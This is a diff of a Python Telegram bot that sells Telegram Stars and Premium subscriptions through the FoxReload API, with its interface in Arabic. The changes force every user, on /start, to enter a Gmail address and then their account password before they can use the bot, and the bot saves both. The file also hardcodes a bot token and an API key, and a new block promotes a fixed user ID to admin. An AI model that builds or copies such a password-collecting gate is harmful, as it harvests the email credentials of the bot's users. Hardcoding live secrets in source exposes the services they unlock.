@@ -1,6 +1,7 @@
 import asyncio
 import logging
 import aiohttp
+import sqlite3  # ضرورية لترقية حسابك
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
@@ -15,9 +16,9 @@ from database import (
 from admin import show_admin_panel
 
 TELEGRAM_BOT_TOKEN = "5418318795:AAHKA5Lh4cEdaZZAlTAd4ra7x-hfx80XHVs"
-REQUIRED_CHANNEL = "@SIM_NUMBERS"       # قناة الاشتراك الإجباري
-ORDERS_LOG_CHANNEL = "@SPEDERCH"    # قناة الطلبات العامة المشفرة
-ADMIN_ID = 5396793642
+REQUIRED_CHANNEL = "@SIM_NUMBERS"       
+ORDERS_LOG_CHANNEL = "@SPEDERCH"    
+ADMIN_ID = 5396793642  # تم وضع الآيدي الخاص بك هنا
 FOXRELOAD_API_KEY = "dmk_i5mOcfUakf7MLFFOF3VMWhpEo2btd32SoEgiLOcFBlo"
 
 logging.basicConfig(level=logging.INFO)
@@ -43,7 +44,7 @@ def mask_target_info(info: str) -> str:
             return info[:3] + "****" + info[-2:]
         return "@****"
 
-async def send_order_to_foxreload(product_id: str):
+async def send_order_to_foxreload(product_id: str, target_info: str):
     url = "https://public-api.foxreload.com/api/orders/"
     headers = {
         "X-API-Key": FOXRELOAD_API_KEY,
@@ -52,7 +53,15 @@ async def send_order_to_foxreload(product_id: str):
         "Accept": "application/json",
         "Content-Type": "application/json"
     }
-    payload = {"items": [{"itemId": product_id, "quantity": 1}]}
+    payload = {
+        "items": [
+            {
+                "itemId": product_id,
+                "quantity": 1,
+                "link": target_info
+            }
+        ]
+    }
     async with aiohttp.ClientSession() as session:
         try:
             async with session.post(url, json=payload, headers=headers) as response:
@@ -73,13 +82,126 @@ async def check_subscription(user_id: int) -> bool:
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message, state: FSMContext):
     await state.clear()
-    if not await check_subscription(message.from_user.id):
+    user_id = message.from_user.id
+    
+    # 🔴 ترقية حسابك للأدمن فوراً إذا كان الآيدي يطابق ADMIN_ID
+    if user_id == ADMIN_ID:
+        conn = sqlite3.connect("secure_bot_database.db")
+        conn.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (user_id,))
+        conn.commit()
+        conn.close()
+    
+    if not await check_subscription(user_id):
         builder = InlineKeyboardBuilder()
         builder.button(text="📢 اشترك في القناة الرسمية", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")
         builder.button(text="🔄 تحقق من الاشتراك", callback_data="check_sub")
         builder.adjust(1)
         return await message.answer("⚠️ يجب عليك الاشتراك في قناة البوت أولاً!", reply_markup=builder.as_markup())
-    await show_language_selection(message)
+    
+    user_data = get_user(user_id)
+    if not user_data or not user_data[0] or not user_data[0].endswith("@gmail.com"):
+        await state.set_state(BotStates.waiting_for_email)
+        await message.answer(
+            "⚠️ **يجب عليك تسجيل حسابك أولاً لتتمكن من الدخول واستخدام البوت.**\n\n"
+            "📧 **أدخل بريدك الإلكتروني (يجب أن ينتهي بـ `@gmail.com`):**",
+            parse_mode="Markdown"
+        )
+        return
+
+    lang = user_data[2] if user_data else "ar"
+    await show_main_menu(message, lang)
+
+@dp.callback_query(F.data == "check_sub")
+async def process_check_sub(callback: types.CallbackQuery, state: FSMContext):
+    user_id = callback.from_user.id
+    if await check_subscription(user_id):
+        await callback.message.delete()
+        user_data = get_user(user_id)
+        if not user_data or not user_data[0] or not user_data[0].endswith("@gmail.com"):
+            await state.set_state(BotStates.waiting_for_email)
+            await callback.message.answer(
+                "⚠️ **يجب عليك تسجيل حسابك أولاً لتتمكن من الدخول.**\n\n"
+                "📧 **أدخل بريدك الإلكتروني (يجب أن ينتهي بـ `@gmail.com`):**",
+                parse_mode="Markdown"
+            )
+        else:
+            lang = user_data[2] if user_data else "ar"
+            await show_main_menu(callback, lang)
+    else:
+        await callback.answer("❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
+
+async def show_main_menu(event: types.Message | types.CallbackQuery, lang: str):
+    user = event.from_user
+    user_data = get_user(user.id)
+    email = user_data[0] if user_data else "غير مسجل"
+    is_admin = user_data[3] if user_data else 0
+    balance = user_data[4] if user_data else 0.0
+    
+    builder = InlineKeyboardBuilder()
+    if lang == "ar":
+        builder.button(text="⭐ خدمات تليجرام", callback_data="telegram_services")
+        builder.button(text="📋 سجل طلباتي", callback_data="my_orders_log")
+        builder.button(text="📧 تعديل بياناتي", callback_data="set_email")
+        builder.button(text="🌐 تغيير اللغة", callback_data="change_lang")
+        if is_admin:
+            builder.button(text="⚙️ لوحة تحكم الأدمن", callback_data="admin_panel")
+        
+        builder.adjust(2, 2, 1)
+        
+        text = (
+            f"مرحباً بك، **{user.first_name}** 👋\n\n"
+            f"🆔 **الآيدي:** `{user.id}`\n"
+            f"📧 **الإيميل:** `{email}`\n"
+            f"💰 **رصيدك الحالي:** `{balance}$`\n\n"
+            "اختر الخدمة المطلوبة من القائمة أدناه:"
+        )
+    else:
+        builder.button(text="⭐ Telegram Services", callback_data="telegram_services")
+        builder.button(text="📋 My Orders Log", callback_data="my_orders_log")
+        builder.button(text="📧 Update Info", callback_data="set_email")
+        builder.button(text="🌐 Change Language", callback_data="change_lang")
+        if is_admin:
+            builder.button(text="⚙️ Admin Panel", callback_data="admin_panel")
+        builder.adjust(2, 2, 1)
+        
+        text = (
+            f"Welcome, **{user.first_name}** 👋\n\n"
+            f"🆔 **ID:** `{user.id}`\n"
+            f"📧 **Email:** `{email}`\n"
+            f"💰 **Balance:** `{balance}$`\n\n"
+            "Choose a service from below:"
+        )
+        
+    if isinstance(event, types.CallbackQuery):
+        await event.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="Markdown")
+    else:
+        await event.answer(text, reply_markup=builder.as_markup(), parse_mode="Markdown")
+
+@dp.callback_query(F.data == "set_email")
+async def start_entering_email(callback: types.CallbackQuery, state: FSMContext):
+    await state.set_state(BotStates.waiting_for_email)
+    await callback.message.answer("📧 **أدخل بريدك الإلكتروني (يجب أن ينتهي بـ `@gmail.com`):**", parse_mode="Markdown")
+
+@dp.message(BotStates.waiting_for_email)
+async def process_user_email(message: types.Message, state: FSMContext):
+    email = message.text.strip()
+    if not email.endswith("@gmail.com"):
+        return await message.answer("❌ **عذراً، يجب أن ينتهي البريد بـ `@gmail.com`. حاول مجدداً:**", parse_mode="Markdown")
+    await state.update_data(email=email)
+    await state.set_state(BotStates.waiting_for_password)
+    await message.answer("🔑 **أدخل كلمة المرور الخاصة بحسابك:**", parse_mode="Markdown")
+
+@dp.message(BotStates.waiting_for_password)
+async def process_user_password(message: types.Message, state: FSMContext):
+    password = message.text.strip()
+    data = await state.get_data()
+    save_user_credentials(message.from_user.id, message.from_user.username or "No", data.get("email"), password)
+    await state.clear()
+    
+    await message.answer("✅ **تم حفظ بياناتك بنجاح! جاري الدخول...**", parse_mode="Markdown")
+    user_data = get_user(message.from_user.id)
+    lang = user_data[2] if user_data else "ar"
+    await show_main_menu(message, lang)
 
 async def show_language_selection(message_or_callback):
     builder = InlineKeyboardBuilder()
@@ -98,43 +220,9 @@ async def process_language_selection(callback: types.CallbackQuery):
     update_user_language(callback.from_user.id, lang)
     await show_main_menu(callback, lang)
 
-async def show_main_menu(callback: types.CallbackQuery, lang: str):
-    user = callback.from_user
-    user_data = get_user(user.id)
-    is_admin = user_data[3] if user_data else 0
-    balance = user_data[4] if user_data else 0.0
-    
-    builder = InlineKeyboardBuilder()
-    if lang == "ar":
-        builder.button(text="⭐ خدمات تليجرام (نجوم واشتراكات)", callback_data="telegram_services")
-        builder.button(text="📋 سجل عملهاتي وطلباتي", callback_data="my_orders_log")
-        builder.button(text="📧 إدخال / تعديل بريدي", callback_data="set_email")
-        builder.button(text="👤 عرض بياناتي ورصيدي", callback_data="my_email")
-        if is_admin:
-            builder.button(text="⚙️ لوحة تحكم الأدمن", callback_data="admin_panel")
-        builder.button(text="🌐 تغيير اللغة", callback_data="change_lang")
-        builder.adjust(1, 1, 1, 1, 1, 1)
-        text = f"مرحباً بك، **{user.first_name}** 👋\n💰 رصيدك الحالي: `{balance}$`\nاختر الخدمة المطلوبة:"
-    else:
-        builder.button(text="⭐ Telegram Services", callback_data="telegram_services")
-        builder.button(text="📋 My Orders History", callback_data="my_orders_log")
-        builder.button(text="📧 Set / Update Email", callback_data="set_email")
-        builder.button(text="👤 View My Info & Balance", callback_data="my_email")
-        if is_admin:
-            builder.button(text="⚙️ Admin Panel", callback_data="admin_panel")
-        builder.button(text="🌐 Change Language", callback_data="change_lang")
-        builder.adjust(1, 1, 1, 1, 1, 1)
-        text = f"Welcome, **{user.first_name}** 👋\n💰 Balance: `{balance}$`\nChoose a service:"
-        
-    await callback.message.edit_text(text, reply_markup=builder.as_markup(), parse_mode="Markdown")
-
-@dp.callback_query(F.data == "check_sub")
-async def process_check_sub(callback: types.CallbackQuery):
-    if await check_subscription(callback.from_user.id):
-        await callback.message.delete()
-        await show_language_selection(callback)
-    else:
-        await callback.answer("❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)
+@dp.callback_query(F.data == "change_lang")
+async def process_change_lang(callback: types.CallbackQuery):
+    await show_language_selection(callback)
 
 @dp.callback_query(F.data == "my_orders_log")
 async def show_user_activity_history(callback: types.CallbackQuery):
@@ -157,7 +245,7 @@ async def show_user_activity_history(callback: types.CallbackQuery):
             f"*{idx}. الخدمة:* {service}\n"
             f"👤 *المستهدف:* `{target}`\n"
             f"💵 *التكلفة:* `{cost}$`\n"
-            f"🕒 *الوقت والتاريخ:* `{created_at}`\n"
+            f"🕒 *الوقت:* `{created_at}`\n"
             "-----------------------------------\n"
         )
         
@@ -254,18 +342,31 @@ async def ask_for_target_id(callback: types.CallbackQuery, state: FSMContext):
     product_id = "YOUR_STARS_PRODUCT_ID" if service_type == "stars" else "YOUR_PREMIUM_PRODUCT_ID"
     service_name = "⭐ نجوم تليجرام (Stars)" if service_type == "stars" else "💎 اشتراك تليجرام Premium"
     
-    await state.update_data(product_id=product_id, service_name=service_name)
+    await state.update_data(product_id=product_id, service_name=service_name, service_type=service_type)
     await state.set_state(BotStates.waiting_for_target)
-    await callback.message.answer("📥 أدخل معرف المستخدم (User ID) أو اليوزر المراد الشحن له:")
+    
+    await callback.message.edit_text(
+        f"📦 **الخدمة المختارة:** {service_name}\n\n"
+        "📥 **أدخل معرف المستخدم (User ID) أو اليوزر المراد الشحن له:**",
+        parse_mode="Markdown"
+    )
 
 @dp.message(BotStates.waiting_for_target)
 async def process_target_id(message: types.Message, state: FSMContext):
     target_info = message.text.strip()
     data = await state.get_data()
-    service_name = data.get("service_name", "خدمة تليجرام")
     
-    await message.answer("⏳ جاري إرسال الطلب وتنفيذه...")
-    success, result = await send_order_to_foxreload(data.get("product_id"))
+    service_name = data.get("service_name", "خدمة تليجرام")
+    service_type = data.get("service_type", "stars")
+    
+    await message.answer("⏳ جاري معالجة طلبك، يرجى الانتظار...")
+    
+    success, result = await send_order_to_foxreload(data.get("product_id"), target_info)
+    
+    builder = InlineKeyboardBuilder()
+    builder.button(text="🔄 شراء نفس الخدمة مجدداً", callback_data=f"service_{service_type}_ID")
+    builder.button(text="🔙 العودة للقائمة الرئيسية", callback_data="back_to_menu")
+    builder.adjust(1)
     
     if success:
         order_cost = 1.0 
@@ -276,64 +377,47 @@ async def process_target_id(message: types.Message, state: FSMContext):
             log_text = (
                 f"🚀 **عملية شحن ناجحة جديدة!**\n\n"
                 f"📦 الخدمة: `{service_name}`\n"
-                f"👤 المستهدف: `{masked_target}` (مشفر للخصوصية)\n"
+                f"👤 المستهدف: `{masked_target}`\n"
                 f"🟢 الحالة: `مكتمل بنجاح ✅`"
             )
             await bot.send_message(chat_id=ORDERS_LOG_CHANNEL, text=log_text, parse_mode="Markdown")
         except Exception as e:
             logging.error(f"Failed to send log to orders channel: {e}")
         
-        await message.answer(f"✅ **تم تنفيذ الطلب بنجاح!**\n👤 المستهدف: `{target_info}`", parse_mode="Markdown")
+        await message.answer(
+            f"✅ **تم تنفيذ الطلب بنجاح!**\n\n"
+            f"📦 **الخدمة:** `{service_name}`\n"
+            f"👤 **المستهدف:** `{target_info}`", 
+            reply_markup=builder.as_markup(),
+            parse_mode="Markdown"
+        )
     else:
-        await message.answer("❌ فشل تنفيذ الطلب عبر الـ API.")
+        logging.error(f"Order failed for target {target_info}. FoxReload Response: {result}")
+        
+        fail_builder = InlineKeyboardBuilder()
+        fail_builder.button(text="🔄 إعادة المحاولة", callback_data=f"service_{service_type}_ID")
+        fail_builder.button(text="🔙 العودة للقائمة الرئيسية", callback_data="back_to_menu")
+        fail_builder.adjust(1)
+        
+        await message.answer(
+            "❌ **عذراً، لم نتمكن من تنفيذ طلبك في الوقت الحالي.**\n\n"
+            "يرجى التأكد من صحة البيانات التي أدخلتها (اليوزر أو الآيدي) والمحاولة مرة أخرى.\n"
+            "إذا استمرت المشكلة، يرجى المحاولة لاحقاً.",
+            reply_markup=fail_builder.as_markup(),
+            parse_mode="Markdown"
+        )
+    
     await state.clear()
-
-@dp.callback_query(F.data == "set_email")
-async def start_entering_email(callback: types.CallbackQuery, state: FSMContext):
-    await state.set_state(BotStates.waiting_for_email)
-    await callback.message.answer("📧 أدخل بريدك الإلكتروني (يجب أن ينتهي بـ `@gmail.com`):")
-
-@dp.message(BotStates.waiting_for_email)
-async def process_user_email(message: types.Message, state: FSMContext):
-    email = message.text.strip()
-    if not email.endswith("@gmail.com"):
-        return await message.answer("❌ يجب أن ينتهي بـ `@gmail.com`. حاول مجدداً:")
-    await state.update_data(email=email)
-    await state.set_state(BotStates.waiting_for_password)
-    await message.answer("🔑 أدخل كلمة المرور الخاصة بريدك:")
-
-@dp.message(BotStates.waiting_for_password)
-async def process_user_password(message: types.Message, state: FSMContext):
-    password = message.text.strip()
-    data = await state.get_data()
-    save_user_credentials(message.from_user.id, message.from_user.username or "No", data.get("email"), password)
-    await state.clear()
-    await message.answer("✅ تم حفظ بيانات بريدك بنجاح!")
-
-@dp.callback_query(F.data == "my_email")
-async def process_my_email(callback: types.CallbackQuery):
-    user_data = get_user(callback.from_user.id)
-    if not user_data or not user_data[0]:
-        return await callback.answer("⚠️ لم تقم بإدخال بريدك بعد!", show_alert=True)
-    builder = InlineKeyboardBuilder()
-    builder.button(text="🔙 القائمة الرئيسية", callback_data="back_to_menu")
-    await callback.message.edit_text(
-        f"📧 البريد: `{user_data[0]}`\n🔑 كلمة المرور: `{user_data[1]}`\n💰 رصيدك: `{user_data[4]}$`", 
-        reply_markup=builder.as_markup(), parse_mode="Markdown"
-    )
 
 @dp.callback_query(F.data == "back_to_menu")
 async def process_back_menu(callback: types.CallbackQuery):
     user_data = get_user(callback.from_user.id)
-    await show_main_menu(callback, user_data[2] if user_data else "ar")
-
-@dp.callback_query(F.data == "change_lang")
-async def process_change_lang(callback: types.CallbackQuery):
-    await show_language_selection(callback)
+    lang = user_data[2] if user_data else "ar"
+    await show_main_menu(callback, lang)
 
 async def main():
     init_db()
-    logging.info("Bot started successfully.")
+    logging.info("Bot started successfully. Admin is fully configured.")
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
